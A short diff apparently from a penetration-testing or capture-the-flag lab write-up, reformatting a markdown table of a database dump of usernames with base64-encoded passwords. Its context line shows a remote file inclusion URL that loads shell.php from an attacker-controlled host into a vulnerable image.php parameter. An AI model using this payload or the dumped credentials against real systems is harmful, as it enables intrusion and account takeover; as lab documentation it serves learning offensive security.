@@ -43,7 +43,7 @@ http://192.168.244.58/image.php?img=http://192.168.45.183/shell.php
 SELECT * FROM users;
 
 | username | password                                     |
------------------------------------------------------------
+-----------|----------------------------------------------|
 | josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
 | michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
 | serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
